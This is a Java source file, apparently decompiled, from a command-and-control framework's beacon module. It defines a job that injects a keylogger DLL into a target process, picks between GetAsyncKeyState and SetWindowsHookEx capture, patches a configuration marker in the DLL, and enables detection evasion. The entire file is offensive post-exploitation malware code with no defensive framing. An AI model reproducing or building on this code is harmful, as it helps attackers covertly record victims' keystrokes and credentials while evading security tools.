package beacon.jobs;

import beacon.Job;
import beacon.TaskBeacon;
import common.CommonUtils;
import pe.PostExObfuscator;

public class KeyloggerJob extends Job {
   public static final int METHOD_GETASYNCKEYSTATE = 0;
   public static final int METHOD_SETWINDOWSHOOKEX = 1;
   protected int method;

   public KeyloggerJob(TaskBeacon var1, int var2) {
      super(var1);
      this.method = var2;
   }

   public static KeyloggerJob KeyloggerGetAsyncKeyState(TaskBeacon var0) {
      return new KeyloggerJob(var0, 0);
   }

   public static KeyloggerJob KeyloggerSetWindowsHookEx(TaskBeacon var0) {
      return new KeyloggerJob(var0, 1);
   }

   public String getDescription() {
      return this.isInject() ? "Tasked beacon to log keystrokes in " + this.pid + " (" + this.arch + ")" : "Tasked beacon to log keystrokes";
   }

   public String getShortDescription() {
      return "keystroke logger";
   }

   public String getDLLName() {
      return this.arch.equals("x64") ? "resources/keylogger.x64.dll" : "resources/keylogger.dll";
   }

   public String getPipeName() {
      return "PIPEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
   }

   public int getJobType() {
      return 101;
   }

   public int getCallbackType() {
      return 1;
   }

   public int getWaitTime() {
      return 0;
   }

   public byte[] fix(byte[] var1) {
      String var2 = "$$$KEYLOGGER$$$";
      if (this.method == 0) {
         return CommonUtils.patch(var1, var2, CommonUtils.bString(new byte[16]));
      } else {
         byte[] var3 = CommonUtils.randomData(16);
         var3[0] = 1;
         return CommonUtils.patch(var1, var2, CommonUtils.bString(var3));
      }
   }

   public String getTactic() {
      return "T1056";
   }

   public void obfuscate(PostExObfuscator var1, byte[] var2) {
      var1.enableEvasions();
   }
}
